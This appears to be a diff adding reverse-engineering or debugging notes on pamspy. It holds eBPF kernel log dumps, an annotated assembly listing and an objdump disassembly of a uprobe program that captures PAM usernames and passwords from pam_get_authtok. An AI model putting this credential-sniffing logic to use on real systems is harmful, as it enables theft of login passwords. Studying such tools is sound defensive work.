@@ -1,0 +1,291 @@
+[   50.956701] insn: 0, opcode: 112, class: 1, dst: 2, src: 1, imm: 0                                                                                                                         
+[   50.958473] insn: 1, opcode: 16, class: 5, dst: 2, src: 0, imm: 0                                                                                                                          
+[   50.960092] insn: 2, opcode: 112, class: 1, dst: 1, src: 1, imm: 0                                                                                                                         
+[   50.961620] insn: 3, opcode: 112, class: 3, dst: 10, src: 1, imm: 0                                                                                                                        
+[   50.963147] insn: 4, opcode: 128, class: 5, dst: 0, src: 0, imm: 14                                                                                                                        
+[   50.964624] insn: 5, opcode: 112, class: 7, dst: 0, src: 0, imm: 32                                                                                                                        
+[   50.966028] insn: 6, opcode: 96, class: 3, dst: 10, src: 0, imm: 0                                                                                                                         
+[   50.967373] insn: 7, opcode: 176, class: 7, dst: 2, src: 10, imm: 0                                                                                                                        
+[   50.968665] insn: 8, opcode: 0, class: 7, dst: 2, src: 0, imm: -12                                                                                                                         
+[   50.969947] insn: 9, opcode: 176, class: 7, dst: 3, src: 10, imm: 0                                                                                                                        
+[   50.971231] insn: 10, opcode: 0, class: 7, dst: 3, src: 0, imm: -8                                                                                                                         
+[   50.972506] insn: 11, opcode: 16, class: 0, dst: 1, src: 1, imm: 86746112                                                                                                                  
+[   50.973837] insn: 13, opcode: 176, class: 7, dst: 4, src: 0, imm: 0                                                                                                                        
+[   50.975044] insn: 14, opcode: 128, class: 5, dst: 0, src: 0, imm: 2                                                                                                                        
+[   50.976241] insn: 15, opcode: 176, class: 7, dst: 0, src: 0, imm: 0                                                                                                                        
+[   50.977373] insn: 16, opcode: 144, class: 5, dst: 0, src: 0, imm: 0  
+
+
+
+[   50.983242] insn: 0, opcode: 176, class: 7, dst: 1, src: 0, imm: 0                                                                                                                         
+[   50.984282] insn: 1, opcode: 112, class: 3, dst: 10, src: 1, imm: 0                                                                                                                        
+[   50.985296] insn: 2, opcode: 128, class: 5, dst: 0, src: 0, imm: 14                                                                                                                        
+[   50.986310] insn: 3, opcode: 112, class: 7, dst: 0, src: 0, imm: 32                                                                                                                        
+[   50.987318] insn: 4, opcode: 96, class: 3, dst: 10, src: 0, imm: 0                                                                                                                         
+[   50.988293] insn: 5, opcode: 176, class: 7, dst: 2, src: 10, imm: 0                                                                                                                        
+[   50.989246] insn: 6, opcode: 0, class: 7, dst: 2, src: 0, imm: -12                                                                                                                         
+[   50.990192] insn: 7, opcode: 16, class: 0, dst: 1, src: 1, imm: 86746112                                                                                                                   
+[   50.991160] insn: 9, opcode: 128, class: 5, dst: 0, src: 0, imm: 1                                                                                                                         
+[   50.992073] insn: 10, opcode: 16, class: 5, dst: 0, src: 0, imm: 0                                                                                                                         
+[   50.992980] insn: 11, opcode: 176, class: 7, dst: 1, src: 10, imm: 0                                                                                                                       
+[   50.993897] insn: 12, opcode: 0, class: 7, dst: 1, src: 0, imm: -8                                                                                                                         
+[   50.994759] insn: 13, opcode: 176, class: 7, dst: 2, src: 0, imm: 8                                                                                                                        
+[   50.995630] insn: 14, opcode: 176, class: 7, dst: 3, src: 0, imm: 0                                                                                                                        
+[   50.996492] insn: 15, opcode: 128, class: 5, dst: 0, src: 0, imm: 4                                                                                                                        
+[   50.997365] insn: 16, opcode: 176, class: 7, dst: 2, src: 10, imm: 0                                                                                                                       
+[   50.998227] insn: 17, opcode: 0, class: 7, dst: 2, src: 0, imm: -12                                                                                                                        
+[   50.999065] insn: 18, opcode: 16, class: 0, dst: 1, src: 1, imm: 86746112                                                                                                                  
+[   50.999945] insn: 20, opcode: 128, class: 5, dst: 0, src: 0, imm: 3                                                                                                                        
+[   51.000758] insn: 21, opcode: 80, class: 5, dst: 0, src: 0, imm: 0                                                                                                                         
+[   51.001542] insn: 22, opcode: 176, class: 7, dst: 6, src: 0, imm: 0                                                                                                                        
+[   51.002343] insn: 23, opcode: 112, class: 3, dst: 10, src: 6, imm: 0                                                                                                                       
+[   51.003162] insn: 24, opcode: 112, class: 1, dst: 3, src: 10, imm: 0                                                                                                                       
+[   51.003972] insn: 25, opcode: 176, class: 7, dst: 1, src: 10, imm: 0                                                                                                                       
+[   51.004798] insn: 26, opcode: 0, class: 7, dst: 1, src: 0, imm: -24   
+[   51.005578] insn: 27, opcode: 176, class: 7, dst: 2, src: 0, imm: 8                                                                                                       01:47:21 [5/1835]
+[   51.006344] insn: 28, opcode: 128, class: 5, dst: 0, src: 0, imm: 4
+[   51.007102] insn: 29, opcode: 112, class: 3, dst: 10, src: 6, imm: 0
+[   51.007852] insn: 30, opcode: 112, class: 1, dst: 3, src: 10, imm: 0
+[   51.008602] insn: 31, opcode: 0, class: 7, dst: 3, src: 0, imm: 48
+[   51.009328] insn: 32, opcode: 176, class: 7, dst: 1, src: 10, imm: 0
+[   51.010080] insn: 33, opcode: 0, class: 7, dst: 1, src: 0, imm: -32
+[   51.010792] insn: 34, opcode: 176, class: 7, dst: 2, src: 0, imm: 8
+[   51.011496] insn: 35, opcode: 128, class: 5, dst: 0, src: 0, imm: 4
+[   51.012200] insn: 36, opcode: 16, class: 0, dst: 1, src: 1, imm: 97555712
+[   51.012975] insn: 38, opcode: 176, class: 7, dst: 2, src: 0, imm: 180
+[   51.013687] insn: 39, opcode: 176, class: 7, dst: 3, src: 0, imm: 0
+[   51.014369] insn: 40, opcode: 128, class: 5, dst: 0, src: 0, imm: 131
+[   51.015079] insn: 41, opcode: 16, class: 5, dst: 0, src: 0, imm: 0
+[   51.015774] insn: 42, opcode: 96, class: 1, dst: 1, src: 10, imm: 0
+[   51.016472] insn: 43, opcode: 96, class: 3, dst: 0, src: 1, imm: 0
+[   51.017153] insn: 44, opcode: 112, class: 1, dst: 3, src: 10, imm: 0
+[   51.017856] insn: 45, opcode: 176, class: 7, dst: 1, src: 0, imm: 0
+[   51.018525] insn: 46, opcode: 0, class: 7, dst: 1, src: 0, imm: 100
+[   51.019190] insn: 47, opcode: 176, class: 7, dst: 2, src: 0, imm: 80
+[   51.019874] insn: 48, opcode: 176, class: 7, dst: 6, src: 0, imm: 0
+[   51.020528] insn: 49, opcode: 128, class: 5, dst: 0, src: 0, imm: 4
+[   51.021186] insn: 50, opcode: 112, class: 1, dst: 3, src: 10, imm: 0
+[   51.021864] insn: 51, opcode: 176, class: 7, dst: 1, src: 6, imm: 0
+[   51.022521] insn: 52, opcode: 0, class: 7, dst: 1, src: 0, imm: 20
+[   51.023155] insn: 53, opcode: 176, class: 7, dst: 2, src: 0, imm: 80
+[   51.023814] insn: 54, opcode: 128, class: 5, dst: 0, src: 0, imm: 4
+[   51.024447] insn: 55, opcode: 176, class: 7, dst: 1, src: 6, imm: 0
+[   51.025076] insn: 56, opcode: 0, class: 7, dst: 1, src: 0, imm: 4
+[   51.025699] insn: 57, opcode: 176, class: 7, dst: 2, src: 0, imm: 16
+[   51.026334] insn: 58, opcode: 128, class: 5, dst: 0, src: 0, imm: 16
+[   51.026992] insn: 59, opcode: 176, class: 7, dst: 1, src: 6, imm: 0
+[   51.027634] insn: 60, opcode: 176, class: 7, dst: 2, src: 0, imm: 0
+[   51.028253] insn: 61, opcode: 128, class: 5, dst: 0, src: 0, imm: 132
+[   51.028874] insn: 62, opcode: 176, class: 7, dst: 0, src: 0, imm: 0
+[   51.029504] insn: 63, opcode: 144, class: 5, dst: 0, src: 0, imm: 0
+[   51.030116] insn: 62, opcode: 176, class: 7, dst: 0, src: 0, imm: 0
+[   51.030713] insn: 63, opcode: 144, class: 5, dst: 0, src: 0, imm: 0
+[   51.031302] insn: 62, opcode: 176, class: 7, dst: 0, src: 0, imm: 0
+[   51.031896] insn: 63, opcode: 144, class: 5, dst: 0, src: 0, imm: 0
+[   51.032485] insn: 62, opcode: 176, class: 7, dst: 0, src: 0, imm: 0
+[   51.033080] insn: 63, opcode: 144, class: 5, dst: 0, src: 0, imm: 0
+[   51.033684] r0: 1 
+[   51.033926] r1: 1 
+[   51.034157] r2: 1 
+[   51.034391] r3: 1 
+
+
+
+
+
+
+
+
+ldxdw r2, [r1 + 0x70]            ; r2 = *(u64 *)(r1 + 0x70)
+jeq   r2, 0x0, +13               ; if r2 == 0, jump +13 (exit)
+
+ldxdw r1, [r1 + 0x70]            ; r1 = *(u64 *)(r1 + 0x70)
+stdw  [r10 - 8], r1              ; *(u64 *)(r10 - 8) = r1
+
+call  bpf_get_current_pid_tgid   ; r0 = bpf_get_current_pid_tgid()
+rsh   r0, r0, 32                 ; r0 >>= 32 (extract PID)
+stw   [r10 - 12], r0             ; *(u32 *)(r10 - 12) = r0
+
+mov   r2, r10
+add   r2, -12                    ; r2 = &pid
+mov   r3, r10
+add   r3, -8                     ; r3 = &saved ptr
+ldimm64 r1, map_fd               ; r1 = &map
+mov   r4, 0
+
+call  bpf_map_update_elem        ; update map[pid] = ptr
+
+mov   r0, 0
+exit
+
+/* --------------------------------------------------------------- */
+
+mov   r1, 0
+stdw  [r10 - 8], r1              ; *(u64 *)(r10 - 8) = NULL
+
+call  bpf_get_current_pid_tgid   ; r0 = bpf_get_current_pid_tgid()
+rsh   r0, r0, 32                 ; r0 >>= 32
+stw   [r10 - 12], r0             ; *(u32 *)(r10 - 12) = pid
+
+mov   r2, r10
+add   r2, -12                    ; r2 = &pid
+ldimm64 r1, map_fd
+call  bpf_map_lookup_elem        ; r0 = map[pid]
+
+jeq   r0, 0x0, +51               ; if (!r0) return 0
+
+mov   r1, r10
+add   r1, -8                     ; r1 = &phandle
+mov   r2, 8
+mov   r3, r0                     ; r3 = pam_handle_t*
+call  bpf_probe_read             ; copy to phandle
+
+mov   r2, r10
+add   r2, -12                    ; r2 = &pid
+ldimm64 r1, map_fd
+call  bpf_map_delete_elem        ; delete map[pid]
+
+jne   r0, 0x0, +40               ; if (delete failed) return 0
+
+mov   r6, 0
+stdw  [r10 - 24], r6             ; password_addr = 0
+ldxdw r3, [r10 - 8]              ; phandle
+mov   r1, r10
+add   r1, -24                    ; &password_addr
+mov   r2, 8
+call  bpf_probe_read             ; password_addr = phandle->authtok
+
+stdw  [r10 - 32], r6             ; username_addr = 0
+ldxdw r3, [r10 - 8]
+add   r3, 0x30                   ; r3 = &phandle->user
+mov   r1, r10
+add   r1, -32                    ; &username_addr
+mov   r2, 8
+call  bpf_probe_read
+
+ldimm64 r1, ringbuf_fd
+mov   r2, 0xb4                   ; sizeof(event_t)
+mov   r3, 0
+call  bpf_ringbuf_reserve        ; r0 = event_t *e
+
+jeq   r0, 0x0, +20               ; if (!e) skip
+
+ldw   r1, [r10 - 12]             ; r1 = pid
+stw   [r0 + 0], r1               ; e->pid = pid
+
+ldxdw r3, [r10 - 24]             ; password_addr
+mov   r1, r0
+add   r1, 0x64                   ; e->password
+mov   r2, 0x50
+mov   r6, r0                     ; cache e
+call  bpf_probe_read
+
+ldxdw r3, [r10 - 32]             ; username_addr
+mov   r1, r6
+add   r1, 0x14                   ; e->username
+mov   r2, 0x50
+call  bpf_probe_read
+
+mov   r1, r6
+add   r1, 0x4                    ; e->comm
+mov   r2, 0x10
+call  bpf_get_current_comm
+
+mov   r1, r6
+mov   r2, 0
+call  bpf_ringbuf_submit
+
+mov   r0, 0
+exit
+
+
+
+
+
+
+pamspy.kern.o:	file format elf64-bpf
+
+Disassembly of section uprobe/pam_get_authtok:
+
+0000000000000000 <get_addr_pam_get_authtok>:
+       0:	79 12 70 00 00 00 00 00	r2 = *(u64 *)(r1 + 0x70)
+       1:	15 02 0d 00 00 00 00 00	if r2 == 0x0 goto +0xd <get_addr_pam_get_authtok+0x78>
+       2:	79 11 70 00 00 00 00 00	r1 = *(u64 *)(r1 + 0x70)
+       3:	7b 1a f8 ff 00 00 00 00	*(u64 *)(r10 - 0x8) = r1
+       4:	85 00 00 00 0e 00 00 00	call 0xe
+       5:	77 00 00 00 20 00 00 00	r0 >>= 0x20
+       6:	63 0a f4 ff 00 00 00 00	*(u32 *)(r10 - 0xc) = r0
+       7:	bf a2 00 00 00 00 00 00	r2 = r10
+       8:	07 02 00 00 f4 ff ff ff	r2 += -0xc
+       9:	bf a3 00 00 00 00 00 00	r3 = r10
+      10:	07 03 00 00 f8 ff ff ff	r3 += -0x8
+      11:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
+      13:	b7 04 00 00 00 00 00 00	r4 = 0x0
+      14:	85 00 00 00 02 00 00 00	call 0x2
+      15:	b7 00 00 00 00 00 00 00	r0 = 0x0
+      16:	95 00 00 00 00 00 00 00	exit
+
+Disassembly of section uretprobe/pam_get_authtok:
+
+0000000000000000 <trace_pam_get_authtok>:
+       0:	b7 01 00 00 00 00 00 00	r1 = 0x0
+       1:	7b 1a f8 ff 00 00 00 00	*(u64 *)(r10 - 0x8) = r1
+       2:	85 00 00 00 0e 00 00 00	call 0xe
+       3:	77 00 00 00 20 00 00 00	r0 >>= 0x20
+       4:	63 0a f4 ff 00 00 00 00	*(u32 *)(r10 - 0xc) = r0
+       5:	bf a2 00 00 00 00 00 00	r2 = r10
+       6:	07 02 00 00 f4 ff ff ff	r2 += -0xc
+       7:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
+       9:	85 00 00 00 01 00 00 00	call 0x1
+      10:	15 00 33 00 00 00 00 00	if r0 == 0x0 goto +0x33 <trace_pam_get_authtok+0x1f0>
+      11:	bf a1 00 00 00 00 00 00	r1 = r10
+      12:	07 01 00 00 f8 ff ff ff	r1 += -0x8
+      13:	b7 02 00 00 08 00 00 00	r2 = 0x8
+      14:	bf 03 00 00 00 00 00 00	r3 = r0
+      15:	85 00 00 00 04 00 00 00	call 0x4
+      16:	bf a2 00 00 00 00 00 00	r2 = r10
+      17:	07 02 00 00 f4 ff ff ff	r2 += -0xc
+      18:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
+      20:	85 00 00 00 03 00 00 00	call 0x3
+      21:	55 00 28 00 00 00 00 00	if r0 != 0x0 goto +0x28 <trace_pam_get_authtok+0x1f0>
+      22:	b7 06 00 00 00 00 00 00	r6 = 0x0
+      23:	7b 6a e8 ff 00 00 00 00	*(u64 *)(r10 - 0x18) = r6
+      24:	79 a3 f8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x8)
+      25:	bf a1 00 00 00 00 00 00	r1 = r10
+      26:	07 01 00 00 e8 ff ff ff	r1 += -0x18
+      27:	b7 02 00 00 08 00 00 00	r2 = 0x8
+      28:	85 00 00 00 04 00 00 00	call 0x4
+      29:	7b 6a e0 ff 00 00 00 00	*(u64 *)(r10 - 0x20) = r6
+      30:	79 a3 f8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x8)
+      31:	07 03 00 00 30 00 00 00	r3 += 0x30
+      32:	bf a1 00 00 00 00 00 00	r1 = r10
+      33:	07 01 00 00 e0 ff ff ff	r1 += -0x20
+      34:	b7 02 00 00 08 00 00 00	r2 = 0x8
+      35:	85 00 00 00 04 00 00 00	call 0x4
+      36:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
+      38:	b7 02 00 00 b4 00 00 00	r2 = 0xb4
+      39:	b7 03 00 00 00 00 00 00	r3 = 0x0
+      40:	85 00 00 00 83 00 00 00	call 0x83
+      41:	15 00 14 00 00 00 00 00	if r0 == 0x0 goto +0x14 <trace_pam_get_authtok+0x1f0>
+      42:	61 a1 f4 ff 00 00 00 00	r1 = *(u32 *)(r10 - 0xc)
+      43:	63 10 00 00 00 00 00 00	*(u32 *)(r0 + 0x0) = r1
+      44:	79 a3 e8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x18)
+      45:	bf 01 00 00 00 00 00 00	r1 = r0
+      46:	07 01 00 00 64 00 00 00	r1 += 0x64
+      47:	b7 02 00 00 50 00 00 00	r2 = 0x50
+      48:	bf 06 00 00 00 00 00 00	r6 = r0
+      49:	85 00 00 00 04 00 00 00	call 0x4
+      50:	79 a3 e0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x20)
+      51:	bf 61 00 00 00 00 00 00	r1 = r6
+      52:	07 01 00 00 14 00 00 00	r1 += 0x14
+      53:	b7 02 00 00 50 00 00 00	r2 = 0x50
+      54:	85 00 00 00 04 00 00 00	call 0x4
+      55:	bf 61 00 00 00 00 00 00	r1 = r6
+      56:	07 01 00 00 04 00 00 00	r1 += 0x4
+      57:	b7 02 00 00 10 00 00 00	r2 = 0x10
+      58:	85 00 00 00 10 00 00 00	call 0x10
+      59:	bf 61 00 00 00 00 00 00	r1 = r6
+      60:	b7 02 00 00 00 00 00 00	r2 = 0x0
+      61:	85 00 00 00 84 00 00 00	call 0x84
+      62:	b7 00 00 00 00 00 00 00	r0 = 0x0
+      63:	95 00 00 00 00 00 00 00	exit
